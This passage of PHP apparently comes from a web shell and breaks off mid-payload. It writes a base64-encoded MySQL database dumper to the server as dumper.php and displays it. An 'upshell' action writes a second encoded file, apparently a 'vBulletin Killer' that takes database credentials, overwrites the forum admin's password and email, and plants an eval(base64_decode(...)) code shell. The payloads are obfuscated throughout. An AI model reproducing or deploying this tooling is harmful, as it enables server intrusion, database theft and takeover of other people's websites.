USVRMRT0nJmNvcHk7IDIwMDMtMjAwNiB6YXBpbWlyJz4KPEI+PEEgSFJFRj1odHRwOi8vc3lwZXgubmV0L3Byb2R1Y3RzL2R1bXBlci8gU1RZTEU9ImNvbG9yOiB3aGl0ZTsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyI+TXlzcWwgRHVtcGVyIDEuMC45PC9BPjwvQj48SU1HIElEPUdTIFdJRFRIPTEgSEVJR0hUPTEgU1RZTEU9InZpc2liaWxpdHk6IGhpZGRlbjsiPjwvVEQ+CjwvVFI+CjxUUj4KPEZPUk0gTkFNRT1za2IgTUVUSE9EPVBPU1QgQUNUSU9OPWR1bXBlci5waHA+CjxURCBWQUxJR049VE9QIEJHQ09MT1I9I0Y0RjNFRSBTVFlMRT0iRklMVEVSOiBwcm9naWQ6RFhJbWFnZVRyYW5zZm9ybS5NaWNyb3NvZnQuR3JhZGllbnQoZ3JhZGllbnRUeXBlPTAsc3RhcnRDb2xvclN0cj0jRkNGQkZFLGVuZENvbG9yU3RyPSNGNEYzRUUpOyBwYWRkaW5nOiA4cHggOHB4OyI+CnskY29udGVudH0KPFRBQkxFIFdJRFRIPTEwMCUgQk9SREVSPTAgQ0VMTFNQQUNJTkc9MCBDRUxMUEFERElORz0yPgo8VFI+CjxURCBTVFlMRT0nY29sb3I6ICNDRUNFQ0UnIElEPXRpbWVyPjwvVEQ+CjxURCBBTElHTj1SSUdIVD57JGJ1dHRvbnN9PC9URD4KPC9UUj4KPC9UQUJMRT48L1REPgo8L0ZPUk0+CjwvVFI+CjwvVEFCTEU+PC9URD4KPC9UUj4KPC9UQUJMRT48L1REPgo8L1RSPgo8L1RBQkxFPgo8L1REPgo8L1RSPgo8L1RBQkxFPgo8L0JPRFk+CjwvSFRNTD4KSFRNTDsKfQoKZnVuY3Rpb24gdHBsX21haW4oKXsKZ2xvYmFsICRTSzsKcmV0dXJuIDw8PEhUTUwKPEZJRUxEU0VUIG9uQ2xpY2s9ImRvY3VtZW50LnNrYi5hY3Rpb25bMF0uY2hlY2tlZCA9IDE7Ij4KPExFR0VORD4KPElOUFVUIFRZUEU9cmFkaW8gTkFNRT1hY3Rpb24gVkFMVUU9YmFja3VwPgpCYWNrdXAgLyDQodC+0LfQtNCw0L3QuNC1INGA0LXQt9C10YDQstC90L7QuSDQutC+0L/QuNC4INCR0JQmbmJzcDs8L0xFR0VORD4KPFRBQkxFIFdJRFRIPTEwMCUgQk9SREVSPTAgQ0VMTFNQQUNJTkc9MCBDRUxMUEFERElORz0yPgo8VFI+CjxURCBXSURUSD0zNSU+0JHQlDo8L1REPgo8VEQgV0lEVEg9NjUlPjxTRUxFQ1QgTkFNRT1kYl9iYWNrdXA+CnskU0stPnZhcnNbJ2RiX2JhY2t1cCddfQo8L1NFTEVDVD48L1REPgo8L1RSPgo8VFI+CjxURD7QpNC40LvRjNGC0YAg0YLQsNCx0LvQuNGGOjwvVEQ+CjxURD48SU5QVVQgTkFNRT10YWJsZXMgVFlQRT10ZXh0IENMQVNTPXRleHQgVkFMVUU9J3skU0stPnZhcnNbJ3RhYmxlcyddfSc+PC9URD4KPC9UUj4KPFRSPgo8VEQ+0JzQtdGC0L7QtCDRgdC20LDRgtC40Y86PC9URD4KPFREPjxTRUxFQ1QgTkFNRT1jb21wX21ldGhvZD4KeyRTSy0+dmFyc1snY29tcF9tZXRob2RzJ119CjwvU0VMRUNUPjwvVEQ+CjwvVFI+CjxUUj4KPFREPtCh0YLQtdC/0LXQvdGMINGB0LbQsNGC0LjRjzo8L1REPgo8VEQ+PFNFTEVDVCBOQU1FPWNvbXBfbGV2ZWw+CnskU0stPnZhcnNbJ2NvbXBfbGV2ZWxzJ119CjwvU0VMRUNUPjwvVEQ+CjwvVFI+CjwvVEFCTEU+CjwvRklFTERTRVQ+CjxGSUVMRFNFVCBvbkNsaWNrPSJkb2N1bWVudC5za2IuYWN0aW9uWzFdLmNoZWNrZWQgPSAxOyI+CjxMRUdFTkQ+CjxJTlBVVCBUWVBFPXJhZGlvIE5BTUU9YWN0aW9uIFZBTFVFPXJlc3RvcmU+ClJlc3RvcmUgLyDQktC+0YHRgdGC0LDQvdC+0LLQu9C10L3QuNC1INCR0JQg0LjQtyDRgNC10LfQtdGA0LLQvdC+0Lkg0LrQvtC/0LjQuCZuYnNwOzwvTEVHRU5EPgo8VEFCTEUgV0lEVEg9MTAwJSBCT1JERVI9MCBDRUxMU1BBQ0lORz0wIENFTExQQURESU5HPTI+CjxUUj4KPFREPtCR0JQ6PC9URD4KPFREPjxTRUxFQ1QgTkFNRT1kYl9yZXN0b3JlPgp7JFNLLT52YXJzWydkYl9yZXN0b3JlJ119CjwvU0VMRUNUPjwvVEQ+CjwvVFI+CjxUUj4KPFREIFdJRFRIPTM1JT7QpNCw0LnQuzo8L1REPgo8VEQgV0lEVEg9NjUlPjxTRUxFQ1QgTkFNRT1maWxlPgp7JFNLLT52YXJzWydmaWxlcyddfQo8L1NFTEVDVD48L1REPgo8L1RSPgo8L1RBQkxFPgo8L0ZJRUxEU0VUPgo8L1NQQU4+CjxTQ1JJUFQ+CmRvY3VtZW50LnNrYi5hY3Rpb25beyRTSy0+U0VUWydsYXN0X2FjdGlvbiddfV0uY2hlY2tlZCA9IDE7CjwvU0NSSVBUPgoKSFRNTDsKfQoKZnVuY3Rpb24gdHBsX3Byb2Nlc3MoJHRpdGxlKXsKcmV0dXJuIDw8PEhUTUwKPEZJRUxEU0VUPgo8TEVHRU5EPnskdGl0bGV9Jm5ic3A7PC9MRUdFTkQ+CjxUQUJMRSBXSURUSD0xMDAlIEJPUkRFUj0wIENFTExTUEFDSU5HPTAgQ0VMTFBBRERJTkc9Mj4KPFRSPjxURCBDT0xTUEFOPTI+PERJViBJRD1sb2dhcmVhIFNUWUxFPSJ3aWR0aDogMTAwJTsgaGVpZ2h0OiAxNDBweDsgYm9yZGVyOiAxcHggc29saWQgIzdGOURCOTsgcGFkZGluZzogM3B4OyBvdmVyZmxvdzogYXV0bzsiPjwvRElWPjwvVEQ+PC9UUj4KPFRSPjxURCBXSURUSD0zMSU+0KHRgtCw0YLRg9GBINGC0LDQsdC70LjRhtGLOjwvVEQ+PFREIFdJRFRIPTY5JT48VEFCTEUgV0lEVEg9MTAwJSBCT1JERVI9MSBDRUxMUEFERElORz0wIENFTExTUEFDSU5HPTA+CjxUUj48VEQgQkdDT0xPUj0jRkZGRkZGPjxUQUJMRSBXSURUSD0xIEJPUkRFUj0wIENFTExQQURESU5HPTAgQ0VMTFNQQUNJTkc9MCBCR0NPTE9SPSM1NTU1Q0MgSUQ9c3RfdGFiClNUWUxFPSJGSUxURVI6IHByb2dpZDpEWEltYWdlVHJhbnNmb3JtLk1pY3Jvc29mdC5HcmFkaWVudChncmFkaWVudFR5cGU9MCxzdGFydENvbG9yU3RyPSNDQ0NDRkYsZW5kQ29sb3JTdHI9IzU1NTVDQyk7CmJvcmRlci1yaWdodDogMXB4IHNvbGlkICNBQUFBQUEiPjxUUj48VEQgSEVJR0hUPTEyPjwvVEQ+PC9UUj48L1RBQkxFPjwvVEQ+PC9UUj48L1RBQkxFPjwvVEQ+PC9UUj4KPFRSPjxURD7QntCx0YnQuNC5INGB0YLQsNGC0YPRgTo8L1REPjxURD48VEFCTEUgV0lEVEg9MTAwJSBCT1JERVI9MSBDRUxMU1BBQ0lORz0wIENFTExQQURESU5HPTA+CjxUUj48VEQgQkdDT0xPUj0jRkZGRkZGPjxUQUJMRSBXSURUSD0xIEJPUkRFUj0wIENFTExQQURESU5HPTAgQ0VMTFNQQUNJTkc9MCBCR0NPTE9SPSMwMEFBMDAgSUQ9c29fdGFiClNUWUxFPSJGSUxURVI6IHByb2dpZDpEWEltYWdlVHJhbnNmb3JtLk1pY3Jvc29mdC5HcmFkaWVudChncmFkaWVudFR5cGU9MCxzdGFydENvbG9yU3RyPSNDQ0ZGQ0MsZW5kQ29sb3JTdHI9IzAwQUEwMCk7CmJvcmRlci1yaWdodDogMXB4IHNvbGlkICNBQUFBQUEiPjxUUj48VEQgSEVJR0hUPTEyPjwvVEQ+PC9UUj48L1RBQkxFPjwvVEQ+CjwvVFI+PC9UQUJMRT48L1REPjwvVFI+PC9UQUJMRT4KPC9GSUVMRFNFVD4KPFNDUklQVD4KdmFyIFdpZHRoTG9ja2VkID0gZmFsc2U7CmZ1bmN0aW9uIHMoc3QsIHNvKXsKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3RfdGFiJykud2lkdGggPSBzdCA/IHN0ICsgJyUnIDogJzEnOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzb190YWInKS53aWR0aCA9IHNvID8gc28gKyAnJScgOiAnMSc7Cn0KZnVuY3Rpb24gbChzdHIsIGNvbG9yKXsKICAgICAgICBzd2l0Y2goY29sb3IpewogICAgICAgICAgICAgICAgY2FzZSAyOiBjb2xvciA9ICduYXZ5JzsgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDM6IGNvbG9yID0gJ3JlZCc7IGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSA0OiBjb2xvciA9ICdtYXJvb24nOyBicmVhazsKICAgICAgICAgICAgICAgIGRlZmF1bHQ6IGNvbG9yID0gJ2JsYWNrJzsKICAgICAgICB9CiAgICAgICAgd2l0aChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9nYXJlYScpKXsKICAgICAgICAgICAgICAgIGlmICghV2lkdGhMb2NrZWQpewogICAgICAgICAgICAgICAgICAgICAgICBzdHlsZS53aWR0aCA9IGNsaWVudFdpZHRoOwogICAgICAgICAgICAgICAgICAgICAgICBXaWR0aExvY2tlZCA9IHRydWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBzdHIgPSAnPEZPTlQgQ09MT1I9JyArIGNvbG9yICsgJz4nICsgc3RyICsgJzwvRk9OVD4nOwogICAgICAgICAgICAgICAgaW5uZXJIVE1MICs9IGlubmVySFRNTCA/ICI8QlI+XFxuIiArIHN0ciA6IHN0cjsKICAgICAgICAgICAgICAgIHNjcm9sbFRvcCArPSAxNDsKICAgICAgICB9Cn0KPC9TQ1JJUFQ+CkhUTUw7Cn0KCmZ1bmN0aW9uIHRwbF9hdXRoKCRlcnJvcil7CnJldHVybiA8PDxIVE1MCjxTUEFOIElEPWVycm9yPgo8RklFTERTRVQ+CjxMRUdFTkQ+0J7RiNC40LHQutCwPC9MRUdFTkQ+CjxUQUJMRSBXSURUSD0xMDAlIEJPUkRFUj0wIENFTExTUEFDSU5HPTAgQ0VMTFBBRERJTkc9Mj4KPFRSPgo8VEQ+0JTQu9GPINGA0LDQsdC+0YLRiyBTeXBleCBEdW1wZXIgTGl0ZSDRgtGA0LXQsdGD0LXRgtGB0Y86PEJSPiAtIEludGVybmV0IEV4cGxvcmVyIDUuNSssIE1vemlsbGEg0LvQuNCx0L4gT3BlcmEgOCsgKDxTUEFOIElEPXNpZT4tPC9TUEFOPik8QlI+IC0g0LLQutC70Y7Rh9C10L3QviDQstGL0L/QvtC70L3QtdC90LjQtSBKYXZhU2NyaXB0INGB0LrRgNC40L/RgtC+0LIgKDxTUEFOIElEPXNqcz4tPC9TUEFOPik8L1REPgo8L1RSPgo8L1RBQkxFPgo8L0ZJRUxEU0VUPgo8L1NQQU4+CjxTUEFOIElEPWJvZHkgU1RZTEU9ImRpc3BsYXk6IG5vbmU7Ij4KeyRlcnJvcn0KPEZJRUxEU0VUPgo8TEVHRU5EPkVudGVyIGxvZ2luIGFuZCBwYXNzd29yZDwvTEVHRU5EPgo8VEFCTEUgV0lEVEg9MTAwJSBCT1JERVI9MCBDRUxMU1BBQ0lORz0wIENFTExQQURESU5HPTI+CjxUUj4KPFREIFdJRFRIPTQxJT7Qm9C+0LPQuNC9OjwvVEQ+CjxURCBXSURUSD01OSU+PElOUFVUIE5BTUU9bG9naW4gVFlQRT10ZXh0IENMQVNTPXRleHQ+PC9URD4KPC9UUj4KPFRSPgo8VEQ+0J/QsNGA0L7Qu9GMOjwvVEQ+CjxURD48SU5QVVQgTkFNRT1wYXNzIFRZUEU9cGFzc3dvcmQgQ0xBU1M9dGV4dD48L1REPgo8L1RSPgo8L1RBQkxFPgo8L0ZJRUxEU0VUPgo8L1NQQU4+CjxTQ1JJUFQ+CmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzanMnKS5pbm5lckhUTUwgPSAnKyc7CmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdib2R5Jykuc3R5bGUuZGlzcGxheSA9ICcnOwpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3InKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwp2YXIganNFbmFibGVkID0gdHJ1ZTsKPC9TQ1JJUFQ+CkhUTUw7Cn0KCmZ1bmN0aW9uIHRwbF9sKCRzdHIsICRjb2xvciA9IENfREVGQVVMVCl7CiRzdHIgPSBwcmVnX3JlcGxhY2UoIi9cc3syfS8iLCAiICZuYnNwOyIsICRzdHIpOwpyZXR1cm4gPDw8SFRNTAo8U0NSSVBUPmwoJ3skc3RyfScsICRjb2xvcik7PC9TQ1JJUFQ+CgpIVE1MOwp9CgpmdW5jdGlvbiB0cGxfZW5hYmxlQmFjaygpewpyZXR1cm4gPDw8SFRNTAo8U0NSSVBUPmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYWNrJykuZGlzYWJsZWQgPSAwOzwvU0NSSVBUPgoKSFRNTDsKfQoKZnVuY3Rpb24gdHBsX3MoJHN0LCAkc28pewokc3QgPSByb3VuZCgkc3QgKiAxMDApOwokc3QgPSAkc3QgPiAxMDAgPyAxMDAgOiAkc3Q7CiRzbyA9IHJvdW5kKCRzbyAqIDEwMCk7CiRzbyA9ICRzbyA+IDEwMCA/IDEwMCA6ICRzbzsKcmV0dXJuIDw8PEhUTUwKPFNDUklQVD5zKHskc3R9LHskc299KTs8L1NDUklQVD4KCkhUTUw7Cn0KCmZ1bmN0aW9uIHRwbF9iYWNrdXBfaW5kZXgoKXsKcmV0dXJuIDw8PEhUTUwKPENFTlRFUj4KPEgxPllvdSBkb24ndCBoYXZlIHBlcm1pc3Npb25zIHRvIGxpc3QgdGhpcyBkaXI8L0gxPgo8L0NFTlRFUj4KCkhUTUw7Cn0KCmZ1bmN0aW9uIHRwbF9lcnJvcigkZXJyb3IpewpyZXR1cm4gPDw8SFRNTAo8RklFTERTRVQ+CjxMRUdFTkQ+RXJyb3IgY29ubmVjdCB0byBEQjwvTEVHRU5EPgo8VEFCTEUgV0lEVEg9MTAwJSBCT1JERVI9MCBDRUxMU1BBQ0lORz0wIENFTExQQURESU5HPTI+CjxUUj4KPFREIEFMSUdOPWNlbnRlcj57JGVycm9yfTwvVEQ+CjwvVFI+CjwvVEFCTEU+CjwvRklFTERTRVQ+CgpIVE1MOwp9CgpmdW5jdGlvbiBTWERfZXJyb3JIYW5kbGVyKCRlcnJubywgJGVycm1zZywgJGZpbGVuYW1lLCAkbGluZW51bSwgJHZhcnMpIHsKICAgICAgICBpZiAoJGVycm5vID09IDIwNDgpIHJldHVybiB0cnVlOwogICAgICAgIGlmIChwcmVnX21hdGNoKCIvY2htb2RcKFwpLio/OiBPcGVyYXRpb24gbm90IHBlcm1pdHRlZC8iLCAkZXJybXNnKSkgcmV0dXJuIHRydWU7CiAgICAkZHQgPSBkYXRlKCJZLm0uZCBIOmk6cyIpOwogICAgJGVycm1zZyA9IGFkZHNsYXNoZXMoJGVycm1zZyk7CgogICAgICAgIGVjaG8gdHBsX2woInskZHR9PEJSPjxCPkVycm9yIHdhcyBvY2N1cmVkITwvQj4iLCBDX0VSUk9SKTsKICAgICAgICBlY2hvIHRwbF9sKCJ7JGVycm1zZ30gKHskZXJybm99KSIsIENfRVJST1IpOwogICAgICAgIGVjaG8gdHBsX2VuYWJsZUJhY2soKTsKICAgICAgICBkaWUoKTsKfQo/Pgo=
';
    $file       = fopen("dumper.php", "w+");
    $write      = fwrite($file, base64_decode($perltoolss));
    fclose($file);
    echo "<iframe src=dumper.php width=100% height=720px frameborder=0></iframe> ";
} elseif ($action == 'upshell') {
    $file       = fopen($dir . "upshell.php", "w+");
    $perltoolss = 'PCFET0NUWVBFIEhUTUwgUFVCTElDICctLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTicgJ2h0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCc+CjxodG1sPgo8IS0tSXRzIEZpcnN0IFB1YmxpYyBWZXJzaW9uIAoKIC0tPgo8L2h0bWw+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0nQ29udGVudC1UeXBlJyBjb250ZW50PSd0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgnPgo8dGl0bGU+OjogVXBzaGVsbCA6OiBLeW1Mam5rIDo6PC90aXRsZT4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KYSB7IAp0ZXh0LWRlY29yYXRpb246bm9uZTsKY29sb3I6d2hpdGU7CiB9Cjwvc3R5bGU+IAo8c3R5bGU+CmlucHV0IHsgCmNvbG9yOiMwMDAwMzU7IApmb250OjhwdCAndHJlYnVjaGV0IG1zJyxoZWx2ZXRpY2Esc2Fucy1zZXJpZjsKfQouRElSIHsgCmNvbG9yOiMwMDAwMzU7IApmb250OmJvbGQgOHB0ICd0cmVidWNoZXQgbXMnLGhlbHZldGljYSxzYW5zLXNlcmlmO2NvbG9yOiNGRkZGRkY7CmJhY2tncm91bmQtY29sb3I6I0FBMDAwMDsKYm9yZGVyLXN0eWxlOm5vbmU7Cn0KLnR4dCB7IApjb2xvcjojMkEwMDAwOyAKZm9udDpib2xkICA4cHQgJ3RyZWJ1Y2hldCBtcycsaGVsdmV0aWNhLHNhbnMtc2VyaWY7Cn0gCmJvZHksIHRhYmxlLCBzZWxlY3QsIG9wdGlvbiwgLmluZm8Kewpmb250OmJvbGQgIDhwdCAndHJlYnVjaGV0IG1zJyxoZWx2ZXRpY2Esc2Fucy1zZXJpZjsKfQpib2R5IHsKCWJhY2tncm91bmQtY29sb3I6ICNFNUU1RTU7Cn0KLnN0eWxlMSB7Y29sb3I6ICNBQTAwMDB9Ci50ZAp7CmJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7CmJvcmRlci10b3A6IDBweDsKYm9yZGVyLWxlZnQ6IDBweDsKYm9yZGVyLXJpZ2h0OiAwcHg7Cn0KLnRkVVAKewpib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2Owpib3JkZXItdG9wOiAxcHg7CmJvcmRlci1sZWZ0OiAwcHg7CmJvcmRlci1yaWdodDogMHB4Owpib3JkZXItYm90dG9tOiAxcHg7Cn0KLnN0eWxlNCB7Y29sb3I6ICNGRkZGRkY7IH0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPD9waHAKZWNobyAiPENFTlRFUj4KICA8dGFibGUgYm9yZGVyPScxJyBjZWxscGFkZGluZz0nMCcgY2VsbHNwYWNpbmc9JzAnIHN0eWxlPSdib3JkZXItY29sbGFwc2U6IGNvbGxhcHNlOyBib3JkZXItc3R5bGU6IHNvbGlkOyBib3JkZXItY29sb3I6ICNDMEMwQzA7IHBhZGRpbmctbGVmdDogNDsgcGFkZGluZy1yaWdodDogNDsgcGFkZGluZy10b3A6IDE7IHBhZGRpbmctYm90dG9tOiAxJyBib3JkZXJjb2xvcj0nIzExMTExMScgd2lkdGg9Jzg2JScgYmdjb2xvcj0nI0UwRTBFMCc+CiAgICA8dHI+CiAgICAgIDx0ZCBiZ2NvbG9yPScjMDAwMGZmJyBjbGFzcz0ndGQnPjxkaXYgYWxpZ249J2NlbnRlcicgY2xhc3M9J3N0eWxlNCc+IEhheSBjaG9uIG1hIG5ndW9uPC9kaXY+PC90ZD4KICAgICAgPHRkIGJnY29sb3I9JyMwMDAwZmYnIGNsYXNzPSd0ZCcgc3R5bGU9J3BhZGRpbmc6MHB4IDBweCAwcHggNXB4Jz48ZGl2IGFsaWduPSdjZW50ZXInIGNsYXNzPSdzdHlsZTQnPgogICAgICAgIDxkaXYgYWxpZ249J2xlZnQnPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj48L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgIDx0ZCB3aWR0aD0nMTAwJScgaGVpZ2h0PScyODAnIHN0eWxlPSdwYWRkaW5nOjIwcHggMjBweCAyMHB4IDIwcHggJz4iOwoKaWYgKGlzc2V0KCRfUE9TVFsndmJiJ10pKQp7CiAgICBta2RpcigndXBzaGVsbCcsIDA3NTUpOwogICAgY2hkaXIoJ3Vwc2hlbGwnKTsKJGNvbmZpZ3NoZWxsID0gJ1BHaDBiV3crQ2p4MGFYUnNaVDUyUW5Wc2JHVjBhVzRnUzJsc2JHVnlQQzkwYVhSc1pUNEtQR05sYm5SbGNqNEtQR1p2Y20wZ2JXVjBhRzlrUFZCUFUxUWdZV04wYVc5dVBTY25QZ284Wm05dWRDQm1ZV05sUFNkQmNtbGhiQ2NnWTI5c2IzSTlKeU13TURBd01EQW5QazE1YzNGc0lFaHZjM1E4TDJadmJuUStQR0p5UGp4cGJuQjFkQ0IyWVd4MVpUMXNiMk5oYkdodmMzUWdkSGx3WlQxMFpYaDBJRzVoYldVOWFHOXpkRzVoYldVZ2MybDZaVDBuTlRBbklITjBlV3hsUFNkbWIyNTBMWE5wZW1VNklEaHdkRHNnWTI5c2IzSTZJQ013TURBd01EQTdJR1p2Ym5RdFptRnRhV3g1T2lCVVlXaHZiV0U3SUdKdmNtUmxjam9nTVhCNElITnZiR2xrSUNNMk5qWTJOalk3SUdKaFkydG5jbTkxYm1RdFkyOXNiM0k2SUNOR1JrWkdSa1luUGp4aWNqNEtQR1p2Ym5RZ1ptRmpaVDBuUVhKcFlXd25JR052Ykc5eVBTY2pNREF3TURBd0p6NUVRaUJ1WVcxbFBHSnlQand2Wm05dWRENDhhVzV3ZFhRZ2RtRnNkV1U5WkdGMFlXSmhjMlVnZEhsd1pUMTBaWGgwSUc1aGJXVTlaR0p1WVcxbElITnBlbVU5SnpVd0p5QnpkSGxzWlQwblptOXVkQzF6YVhwbE9pQTRjSFE3SUdOdmJHOXlPaUFqTURBd01EQXdPeUJtYjI1MExXWmhiV2xzZVRvZ1ZHRm9iMjFoT3lCaWIzSmtaWEk2SURGd2VDQnpiMnhwWkNBak5qWTJOalkyT3lCaVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lBalJrWkdSa1pHSno0OFluSStDanhtYjI1MElHWmhZMlU5SjBGeWFXRnNKeUJqYjJ4dmNqMG5JekF3TURBd01DYytSRUlnZFhObGNqeGljajQ4TDJadmJuUStQR2x1Y0hWMElIWmhiSFZsUFhWelpYSWdkSGx3WlQxMFpYaDBJRzVoYldVOVpHSjFjMlZ5SUhOcGVtVTlKelV3SnlCemRIbHNaVDBuWm05dWRDMXphWHBsT2lBNGNIUTdJR052Ykc5eU9pQWpNREF3TURBd095Qm1iMjUwTFdaaGJXbHNlVG9nVkdGb2IyMWhPeUJpYjNKa1pYSTZJREZ3ZUNCemIyeHBaQ0FqTmpZMk5qWTJPeUJpWVdOclozSnZkVzVrTFdOdmJHOXlPaUFqUmtaR1JrWkdKejQ4WW5JK0NqeG1iMjUwSUdaaFkyVTlKMEZ5YVdGc0p5QmpiMnh2Y2owbkl6QXdNREF3TUNjK1JFSWdaR0p3WVhOelBHSnlQand2Wm05dWRENDhhVzV3ZFhRZ2RtRnNkV1U5Y0dGemN5QjBlWEJsUFhSbGVIUWdibUZ0WlQxa1luQmhjM01nYzJsNlpUMG5OVEFuSUhOMGVXeGxQU2RtYjI1MExYTnBlbVU2SURod2REc2dZMjlzYjNJNklDTXdNREF3TURBN0lHWnZiblF0Wm1GdGFXeDVPaUJVWVdodmJXRTdJR0p2Y21SbGNqb2dNWEI0SUhOdmJHbGtJQ00yTmpZMk5qWTdJR0poWTJ0bmNtOTFibVF0WTI5c2IzSTZJQ05HUmtaR1JrWW5QanhpY2o0S1BHWnZiblFnWm1GalpUMG5RWEpwWVd3bklHTnZiRzl5UFNjak1EQXdNREF3Sno1VVlXSnNaU0J3Y21WbWFYZzhZbkkrUEM5bWIyNTBQanhwYm5CMWRDQjJZV3gxWlQwbmRtSmlYeWNnZEhsd1pUMTBaWGgwSUc1aGJXVTljSEpsWm1sNElITnBlbVU5SnpVd0p5QnpkSGxzWlQwblptOXVkQzF6YVhwbE9pQTRjSFE3SUdOdmJHOXlPaUFqTURBd01EQXdPeUJtYjI1MExXWmhiV2xzZVRvZ1ZHRm9iMjFoT3lCaWIzSmtaWEk2SURGd2VDQnpiMnhwWkNBak5qWTJOalkyT3lCaVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lBalJrWkdSa1pHSno0OFluSStDanhtYjI1MElHWmhZMlU5SjBGeWFXRnNKeUJqYjJ4dmNqMG5JekF3TURBd01DYytWWE5sY2lCaFpHMXBianhpY2o0OEwyWnZiblErUEdsdWNIVjBJSFpoYkhWbFBYSnZiM1FnZEhsd1pUMTBaWGgwSUc1aGJXVTlkWE5sY2lCemFYcGxQU2MxTUNjZ2MzUjViR1U5SjJadmJuUXRjMmw2WlRvZ09IQjBPeUJqYjJ4dmNqb2dJekF3TURBd01Ec2dabTl1ZEMxbVlXMXBiSGs2SUZSaGFHOXRZVHNnWW05eVpHVnlPaUF4Y0hnZ2MyOXNhV1FnSXpZMk5qWTJOanNnWW1GamEyZHliM1Z1WkMxamIyeHZjam9nSTBaR1JrWkdSaWMrUEdKeVBnbzhabTl1ZENCbVlXTmxQU2RCY21saGJDY2dZMjlzYjNJOUp5TXdNREF3TURBblBrNWxkeUJ3WVhOeklHRmtiV2x1UEdKeVBqd3ZabTl1ZEQ0OGFXNXdkWFFnZG1Gc2RXVTlNVEl6TkRVMklIUjVjR1U5ZEdWNGRDQnVZVzFsUFhCaGMzTWdjMmw2WlQwbk5UQW5JSE4wZVd4bFBTZG1iMjUwTFhOcGVtVTZJRGh3ZERzZ1kyOXNiM0k2SUNNd01EQXdNREE3SUdadmJuUXRabUZ0YVd4NU9pQlVZV2h2YldFN0lHSnZjbVJsY2pvZ01YQjRJSE52Ykdsa0lDTTJOalkyTmpZN0lHSmhZMnRuY205MWJtUXRZMjlzYjNJNklDTkdSa1pHUmtZblBqeGljajRLUEdadmJuUWdabUZqWlQwblFYSnBZV3duSUdOdmJHOXlQU2NqTURBd01EQXdKejVPWlhjZ1JTMXRZV2xzSUdGa2JXbHVQR0p5UGp3dlptOXVkRDQ4YVc1d2RYUWdkbUZzZFdVOWEzbHRiR3B1YTBCNVlXaHZieTVqYjIwZ2RIbHdaVDEwWlhoMElHNWhiV1U5WlcxaGFXd2djMmw2WlQwbk5UQW5JSE4wZVd4bFBTZG1iMjUwTFhOcGVtVTZJRGh3ZERzZ1kyOXNiM0k2SUNNd01EQXdNREE3SUdadmJuUXRabUZ0YVd4NU9pQlVZV2h2YldFN0lHSnZjbVJsY2pvZ01YQjRJSE52Ykdsa0lDTTJOalkyTmpZN0lHSmhZMnRuY205MWJtUXRZMjlzYjNJNklDTkdSa1pHUmtZblBqeGljajRLUEdadmJuUWdabUZqWlQwblFYSnBZV3duSUdOdmJHOXlQU2NqTURBd01EQXdKejVEYjJSbElGTm9aV3hzUEdKeVBqd3ZabTl1ZEQ0OGRHVjRkR0Z5WldFZ2JtRnRaVDBpWkdGMFlTSWdZMjlzY3owaU5EQWlJSEp2ZDNNOUlqRXdJajRrYzNCaFkyVnlYMjl3Wlc0S2V5UjdaWFpoYkNoaVlYTmxOalJmWkdWamIyUmxLQ0poVjFsdllWaE9lbHBZVVc5S1JqbFJWREZPVlZkNVpGUmtWMG9nZEdGWVVXNVlVMnR3Wlhjd1MwbERRV2RKUTFKdFlWZDRiRnBIYkhsSlJEQm5TV2xKTjBsQk1FdEpRMEZuU1VOU2RGa2dXR2h0WVZkNGJFbEVNR2RLZWtsM1RVUkJkMDFFUVc1UGR6QkxSRkZ2WjBsRFFXZEtTRlo2V2xoS2JXRlhlR3hZTWpVZ2FHSlhWV2RRVTBGcldEQmFTbFJGVmxSWGVXUndZbGRHYmxwVFpHUlhlV1IxV1ZjeGJFb3hNRGRFVVc5blNVTkJaMG9nU0ZaNldsaEtiV0ZYZUd4WU0xSjBZME5CT1VsRFVtWlNhMnhOVWxaT1lrb3liSFJaVjJSc1NqRXhZa296VW5SalJqa2dkVmxYTVd4S01UQTNSRkZ2WjBsRFFXZGhWMWxuUzBkc2VtTXlWakJMUTFKbVVtdHNUVkpXVG1KS01teDBXVmRrYkVvZ01URmlTakkxYUdKWFZXNVlVMnR3U1VoelRrTnBRV2RKUTBGblNVTkJaMHBIUm1saU1sRm5VRk5CYTFwdGJITmFWMUlnY0dOcE5HdGtXRTVzWTIxYWNHSkhWbVppYlVaMFdsUnpUa05wUVdkSlEwRm5TVU5CWjFGSE1YWmtiVlptWkZoQ2MySWdNa1pyV2xkU1pscHRiSE5hVTJkclpGaE9iR050V25CaVIxWm1aRWN4ZDB4RFFXdFpWMHAyV2tOck4wUlJiMmRKUVRBZ1MxcFhUbTlpZVVrNFdUSldkV1JIVm5sUWFuaHBVR3RTZG1KdFZXZFFWREFyU1VOU01XTXlWbmxhYld4eldsWTVkVmtnVnpGc1VFTTVhVkJxZDNaWk1sWjFaRWRXZVZCcFNUZEVVWEE1UkZGd09VUlJjR3hpU0U1c1pYY3dTMXBYVG05aWVXTWdUa05xZUcxaU0wcDBTVWN4YkdSSGFIWmFSREJwVlVVNVZGWkRTV2RaVjA0d1lWYzVkVkJUU1dsSlIxWjFXVE5TTldNZ1IxVTVTVzB4TVdKSVVuQmpSMF